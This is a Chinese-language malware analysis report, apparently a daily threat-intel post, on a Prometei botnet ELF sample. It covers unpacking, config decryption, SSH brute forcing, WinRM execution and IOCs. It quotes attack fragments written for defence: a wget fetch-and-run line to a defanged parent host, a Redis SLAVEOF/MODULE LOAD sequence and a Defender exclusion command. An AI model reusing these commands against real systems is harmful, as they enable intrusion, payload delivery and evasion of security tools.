---
title: "恶意样本分析：Prometei（ELF · elf · 3b4cad8a）"
published: 2026-11-03
draft: false
description: "恶意（置信度高）：Prometei · botnet/loader/downloader · 难度 medium · 动态沙箱 + 静态反编译"
tags: ["Prometei", "botnet", "loader", "downloader", "ELF"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Prometei** · 置信度 **高**
> 
> 别名：Prometei botnet、UPlugPlay、Prometei miner
> 
> 解包后反编译可见完整的横向移动与远控逻辑：SSH 弱口令爆破、WinRM/WinRS 远程命令执行、SMB/WinRM 组件投放、Redis MODULE LOAD 利用、HTTP 回连与载荷下载；隔离沙箱真实执行时观察到 UPX 自解压、配置/组件路径探测与 pgrep netwalker 单实例检查。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Prometei** · 别名 Prometei botnet、UPlugPlay、Prometei miner |
| 置信度 | **高** |
| 行为类 | botnet · loader · downloader |
| 难度 | medium |
| 首次出现 | 2026-10-31 11:40:19 |
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/3b4cad8aa3ebb4d62394af09991dd06a5ec2f5b62bfe01fb324558a3457408e4/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">UPX 自解压</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027.002</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">解密读取配置</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="134" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">单实例进程检查</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1057</text>
<rect x="586" y="123" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="138" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">动态观测</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">SSH 弱口令横移</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1110.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">WinRM 远程执行</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1021.006</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `3b4cad8aa3ebb4d62394af09991dd06a5ec2f5b62bfe01fb324558a3457408e4` |
| MD5 | _未记录_ |
| 大小 | 1,773,480 字节（1.7 MB） |
| 类型 | ELF · `elf` |

## 行为分析

共 **12** 条行为，每条都挂了证据；其中 **11** 条静态可得、**1** 条经动态分析取得。

### 1. UPX 自解压

`T1027.002` · 置信度 **高** · 静态

样本以 UPX 4.24 打包，入口为解压 stub；运行时通过 mmap/mprotect 还原约 4.2 MB 主体后跳转 OEP。

> **证据**：packed ELF entry 0xE04CA8；整文件熵 7.94；系统调用跟踪可见 0x400000/0x401000 的 mmap/mprotect 解压
> 
> **来源**：`ref:1116d7d71f` · `ref:89dc5f332c` · `ev-000060` · `ref:58d0c60c0f`

### 2. 解密读取配置

`T1140` · 置信度 **高** · 静态

主函数读取 walker.dat/walker.ini，使用硬编码密钥 Qwdrosd3grdsfFsz 解密并解析包含 config/id/enckey/ParentHostname/ip/ParentIP 的 JSON 配置。

> **证据**：FUN_004431f7 @0x4431f7 调用 FUN_0042133c("Qwdrosd3grdsfFsz",...)；JSON 键 @0x36041/0x361a4/0x362f5/0x3644e
> 
> **来源**：`ev-000015` · `ev-000019` · `ref:58d0c60c0f` · `ev-000060`

### 3. 单实例进程检查

`T1057` · 置信度 **高** · 动态

启动后执行 /bin/sh -c "pgrep netwalker"，若已有同名进程则不再启动，避免重复驻留。

> **证据**：动态跟踪：execve("/bin/sh", ["sh","-c","pgrep netwalker"])
> 
> **来源**：`ref:58d0c60c0f`

### 4. SSH 弱口令横移

`T1110.001` · 置信度 **高** · 静态

内置 libssh 客户端与约百条口令字典，连接 22/tcp 尝试 ssh_userauth_password；成功后执行 uname -a、hostname、uname -m&&pkill upnpsetup 并下发载荷。

> **证据**：FUN_0043e9ec @0x43e9ec 使用 aes128-ctr；口令表 @0x31bed0；格式串 "%s ssh %s:22" @0x31cb34
> 
> **来源**：`ev-000017` · `ev-000060` · `ref:522c329945`

### 5. WinRM 远程执行

`T1021.006` · 置信度 **高** · 静态

通过 hxxp://<host>:5985/wsman 的 WinRS SOAP 请求（Negotiate/NTLM）在远端 cmd.exe 执行 PowerShell 命令。

> **证据**：SOAP 模板 @0x319c2e/0x31a3bf；WINRS_SKIP_CMD_SHELL/WINRS_CONSOLEMODE_STDIN；FUN_0043cfd3 @0x43cfd3
> 
> **来源**：`ev-000018` · `ref:522c329945` · `ev-000060`

### 6. 投放 Windows 组件

`T1105` · 置信度 **高** · 静态

经 WinRM/SMB 向 C:\Windows 写入 zsvc.exe、winhlpx64.exe、mshlpda32.dll、ssldata2.dll、uplugplay、netwalker、updates1.7z/2.7z、7z.exe/7z.dll，并执行 winhlpx64.exe。

> **证据**：FUN_0043cfd3 上传至 C:\Windows\...；路径字符串 @0x31c473-0x31c536
> 
> **来源**：`ev-000018` · `ev-000060`

### 7. 添加 Defender 排除

`T1562.001` · 置信度 **高** · 静态

通过 PowerShell Add-MpPreference -ExclusionPath 把 C:\Windows 与 C:\Windows\Dell 加入 Defender 排除，规避查杀。

> **证据**：0x43d36a/0x43d43e -> Add-MpPreference -ExclusionPath "C:\Windows"/"C:\Windows\Dell"
> 
> **来源**：`ev-000018` · `ev-000060`

### 8. Redis 模块加载

`T1210` · 置信度 **高** · 静态

对 6379/tcp Redis 发送 SLAVEOF 与 CONFIG SET dir /tmp/、CONFIG SET dbfilename plugin1.so，再 MODULE LOAD /tmp/plugin1.so 实现未授权命令执行。

> **证据**：字符串 @0x31cb75-0x31cbeb；xref 0x448ad9 -> SLAVEOF %s 16379
> 
> **来源**：`ev-000060` · `ev-000019` · `ref:522c329945`

### 9. 下载并运行载荷

`T1105` · 置信度 **高** · 静态

构造 wget -nc hxxp://<parent>/k.php?a=<arch>,<id> -O ./upnpsetup，chmod 777 后以 sudo ./upnpsetup 执行，并清理旧进程与临时文件。

> **证据**：0x44089b -> wget .../k.php?a=；0x31c6e9 chmod 777 ./upnpsetup；0x31c6ff sudo ./upnpsetup
> 
> **来源**：`ev-000060` · `ref:522c329945`

### 10. HTTP 回连 C2

`T1071.001` · 置信度 **中** · 静态

以 hxxp://<ParentHost>/k.php?good=<id>&i=<ip> 上报上线/心跳，主机名与 IP 来自加密配置或父节点下发。

> **证据**：0x442fc3 -> hxxp://%s/k.php?good=%s&i=%s
> 
> **来源**：`ev-000060` · `ev-000019` · `ref:522c329945`

### 11. 驻留 /usr/sbin

`T1036.005` · 置信度 **高** · 静态

将自身/组件复制为 /usr/sbin/netwalker、/usr/sbin/uplugplay、/etc/uplugplay、/etc/CommId，chmod 777 并以该路径重启，伪装成系统程序。

> **证据**：/usr/sbin/netwalker @0x31c8be；/etc/CommId @0x40db08；chmod 777 netwalker @0x31c8f0
> 
> **来源**：`ev-000060` · `ev-000016` · `ref:522c329945`

### 12. 采集主机指纹

`T1082` · 置信度 **高** · 静态

通过 SSH 会话执行 uname -a、hostname、uname -m，识别 Darwin/Linux 与 CPU 架构以选择对应载荷。

> **证据**：FUN_0043e9ec @0x43e9ec 执行 uname -a / hostname / uname -m&&pkill upnpsetup
> 
> **来源**：`ev-000017` · `ref:522c329945`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://<ParentHost>/k.php?good=<id>&i=<ip>` | 80 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxp://<ParentHost>/k.php?a=<arch>,<id>` | 80 | download | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/usr/sbin/uplugplay`
- `/usr/sbin/netwalker`
- `/usr/sbin/walker.ini`
- `/etc/uplugplay`
- `/etc/CommId`
- `/tmp/plugin1.so`
- `/tmp/upnpsetup`
- `.cpass`
- `walker.dat`
- `walker.ini`
- `updatecheckerd.dat`
- `desktop.dat`
- `uplugplay_new`
- `sqhost.exe`
- `rdpcIip.exe`
- `7z.exe`
- `7z.dll`
- `updates1.7z`
- `updates2.7z`
- `C:\Windows\zsvc.exe`
- `C:\Windows\winhlpx64.exe`
- `C:\Windows\mshlpda32.dll`
- `C:\Windows\ssldata2.dll`
- `C:\Windows\uplugplay`
- `C:\Windows\netwalker`
- `C:\Windows\updates1.7z`
- `C:\Windows\updates2.7z`
- `C:\Windows\7z.exe`
- `C:\Windows\7z.dll`
- `C:\Windows\sqhost.exe`
- `C:\Windows\Dell`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `ParentHostname / ParentIP，来自 walker.dat/walker.ini 的 JSON 配置` | 是 | 动态 |
| `c2_url` | `hxxp://<ParentHost>/k.php?good=<id>&i=<ip>` | 是 | 静态 |
| `payload_url` | `hxxp://<ParentHost>/k.php?a=<arch>,<id>` | 是 | 静态 |
| `node_id` | `config.id` | 是 | 动态 |
| `enckey` | `config.enckey（每节点密钥）` | 是 | 动态 |
| `encryption_algo` | `配置解密 AES-128（硬编码密钥 Qwdrosd3grdsfFsz）；SSH 会话 aes128-ctr` | 否 | 静态 |
| `install_path` | `/usr/sbin/netwalker, /usr/sbin/uplugplay, /etc/CommId, C:\Windows\...` | 是 | 静态 |
| `version` | `v4.55` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 未发现文件加密、勒索信或扩展名篡改逻辑，不应归类为 ransomware；AES/OpenSSL 常量用于配置解密与 SSH/WinRM 加密通信。
- 本文件是 Linux ELF，虽然包含 Windows 组件投放与 PowerShell 命令，但不能据此断言它在 Windows 上直接运行；Windows 侧行为由被投放组件执行。
- 未取得真实 C2 域名/IP：配置由 walker.dat 或父节点下发，静态仅得到 URL 模板，不能把 8.8.8[.]8 或 127.0.0[.]1 当作 C2。
- 不应把该样本当作纯挖矿程序：本模块未包含矿池/钱包字符串，挖矿能力可能由后续下载组件提供。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 脱壳 | 是（stage2 `3a69569f3152708d11d38e958094d7041a0ea5d54a50c39447886fccef99c1b5`） |

**局限与待验证**

1. 样本为 UPX 加壳的静态链接 ELF，解包后仍为 stripped，函数名依赖反编译推断。
2. 实际 C2 主机/IP、节点 id、enckey 未从 walker.dat/walker.ini 取得（沙箱内文件不存在），c2 字段为静态 URL 模板，pending_dynamic_verify=true。
3. 动态执行 25 秒超时，未观测到网络外联或横向移动成功；横向移动能力来自静态反编译与字符串，未在真实网络验证。
4. Windows 侧注册表/服务持久化（如 UPlugPlay 服务、MachineKeyId/CommId 注册表项）由投放的 Windows 组件实现，本 ELF 中无对应代码，未列入 host_iocs.registry/services。
5. 未提取内嵌 Windows 组件（zsvc.exe/winhlpx64.exe 等）样本，stage2 为空。

## 证据索引

<details>
<summary>展开 12 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ref:1116d7d71f` | ELF 结构解析 | 原样本 ELF 结构：3 个 PT_LOAD、无节表/符号，入口 0xE04CA8 位于 UPX stub |
| `ref:89dc5f332c` | scan.entropy | 整文件熵 7.94，提示加壳/加密 |
| `ev-000060` | evidence.record | UPX 4.24 解包结果（sha256 3a69569f...）及关键字符串/交叉引用汇总 |
| `ref:a81fee2589` | ELF 结构解析 | 解包后 ELF 结构：4 个 PT_LOAD、.text 3.2 MB、静态链接 stripped |
| `ev-000004` | 密码学常量识别 | AES S-box 常量 @0x40c2c0 |
| `ev-000014` | 字符串提取 | 解包后 13684 条 ASCII 字符串抽取 |
| `ev-000015` | decompile.ghidra | 主函数反编译：读取 walker.dat、密钥 Qwdrosd3grdsfFsz、配置解析 |
| `ev-000016` | decompile.ghidra | 安装/参数处理函数：/proc/self/exe、/etc/CommId、.cpass |
| `ev-000017` | decompile.ghidra | SSH 模块：libssh aes128-ctr、uname -a、hostname、uname -m |
| `ev-000018` | decompile.ghidra | WinRM 模块：Add-MpPreference、C:\Windows 组件投放、PowerShell 执行 |
| `ev-000019` | decompile.ghidra | 主函数反编译（含 C2/传播逻辑引用） |
| `ref:58d0c60c0f` | dyn.trace | 隔离沙箱系统调用跟踪：UPX 解压、配置/组件路径探测、pgrep netwalker；25 秒超时 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
